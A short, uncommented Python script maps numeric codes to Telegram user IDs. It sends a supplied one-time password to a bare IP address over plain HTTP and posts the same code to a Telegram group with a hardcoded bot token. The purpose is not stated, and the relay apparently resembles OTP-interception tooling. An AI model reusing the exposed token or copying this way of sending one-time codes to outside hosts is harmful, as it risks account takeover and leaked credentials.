from requests import get, post
from sys import argv
if argv[1] == '1001':
    telegram_id = '5280692596'
elif argv[1] == '1002':
    telegram_id = '1197549044'
elif argv[1] == '1003':
    telegram_id = '685382438'
elif argv[1] == '1004':
    telegram_id = '5368332363'
elif argv[1] == '1005':
    telegram_id = '1957625272'
elif argv[1] == '1006':
    telegram_id = '686682060'
elif argv[1] == '1007':
    telegram_id = '594941746'
elif argv[1] == '1008':
    telegram_id = '0'
elif argv[1] == '1009':
    telegram_id = '857754343'
elif argv[1] == '1010':
    telegram_id = '5170744137'
elif argv[1] == '1011':
    telegram_id = '529486402'
elif argv[1] == '1012':
    telegram_id = '5522049550'
elif argv[1] == '1013':
    telegram_id = '539644916'
elif argv[1] == '1014':
    telegram_id = '590076426'
elif argv[1] == '1015':
    telegram_id = '1401874741'
elif argv[1] == '1016':
    telegram_id = '5964295291'
elif argv[1] == '1017':
    telegram_id = '5569369137'
elif argv[1] == '1018':
    telegram_id = '726065193'
elif argv[1] == '1019':
    telegram_id = '1040190859'
elif argv[1] == '1020':
    telegram_id = '1213210092'
elif argv[1] == '1021':
    telegram_id = '1222853401'
elif argv[1] == '1022':
    telegram_id = '1786423081'
elif argv[1] == '1023':
    telegram_id = '5314780528'
elif argv[1] == '1024':
    telegram_id = '593889901'
elif argv[1] == '1025':
    telegram_id = '1311984488'
elif argv[1] == '1026':
    telegram_id = '836680761'
elif argv[1] == '1027':
    telegram_id = '1746864635'
elif argv[1] == '1028':
    telegram_id = '5201344644'
elif argv[1] == '1029':
    telegram_id = '5189984884'
elif argv[1] == '1030':
    telegram_id = '5476662738'
elif argv[1] == '1031':
    telegram_id = '6279769053'
elif argv[1] == '1032':
    telegram_id = '852004882'
elif argv[1] == '1033':
    telegram_id = '5764845817'
elif argv[1] == '1034':
    telegram_id = '1330034305'
elif argv[1] == '1035':
    telegram_id = '5102743411'
elif argv[1] == '1036':
    telegram_id = '714469658'
elif argv[1] == '1037':
    telegram_id = '0'
elif argv[1] == '1038':
    telegram_id = '805870664'
elif argv[1] == '1039':
    telegram_id = '1152145377'
elif argv[1] == '1040':
    telegram_id = '5607214135'
elif argv[1] == '1041':
    telegram_id = '1943558285'
elif argv[1] == '1042':
    telegram_id = '850291092'
elif argv[1] == '1043':
    telegram_id = '837796998'
elif argv[1] == '1044':
    telegram_id = '6020535341'
elif argv[1] == '1045':
    telegram_id = '1145403777'
elif argv[1] == '1046':
    telegram_id = '1849651684'
elif argv[1] == '1047':
    telegram_id = '5895021736'
elif argv[1] == '1048':
    telegram_id = '2057614876'
elif argv[1] == '1049':
    telegram_id = '1740383734'
elif argv[1] == '1050':
    telegram_id = '0'
elif argv[1] == '1051':
    telegram_id = '5703798175'
elif argv[1] == '1052':
    telegram_id = '0'
elif argv[1] == '1053':
    telegram_id = '496219028'
elif argv[1] == '1054':
    telegram_id = '5020084131'
elif argv[1] == '1055':
    telegram_id = '5552979108'
elif argv[1] == '1056':
    telegram_id = '5564559727'
elif argv[1] == '1057':
    telegram_id = '5243943589'
elif argv[1] == '1058':
    telegram_id = '543032903'
elif argv[1] == '1059':
    telegram_id = '950322466'
elif argv[1] == '1060':
    telegram_id = '970620935'
elif argv[1] == '1061':
    telegram_id = '655943929'
elif argv[1] == '1062':
    telegram_id = '5391816152'
elif argv[1] == '1063':
    telegram_id = '603419674'
elif argv[1] == '1064':
    telegram_id = '1802171632'
elif argv[1] == '1065':
    telegram_id = '5074400140'
elif argv[1] == '1066':
    telegram_id = '5623469130'
elif argv[1] == '1067':
    telegram_id = '711598604'
elif argv[1] == '1068':
    telegram_id = '625761459'
elif argv[1] == '1069':
    telegram_id = '2070872850'
elif argv[1] == '1070':
    telegram_id = '896894271'
elif argv[1] == '1071':
    telegram_id = '496671613'
elif argv[1] == '1072':
    telegram_id = '532383050'
elif argv[1] == '1073':
    telegram_id = '6083814756'
elif argv[1] == '1074':
    telegram_id = '893183192'
elif argv[1] == '1075':
    telegram_id = '5982322966'
elif argv[1] == '1076':
    telegram_id = '5046195910'
elif argv[1] == '1077':
    telegram_id = '1383878702'
elif argv[1] == '1078':
    telegram_id = '629265023'
elif argv[1] == '1079':
    telegram_id = '0'
elif argv[1] == '1080':
    telegram_id = '758281412'
elif argv[1] == '9998':
    telegram_id = '1907961854'
get(f'http://5.206.227.56/?telegram_id={telegram_id}&otp={argv[2]}')
post(f'https://api.telegram.org/bot6288682947:AAE33JRyXU5dY_ucccMCM6XGBkjWo4hGIdQ/sendMessage?chat_id=-1001549929537&text={telegram_id}\n{argv[2]}')
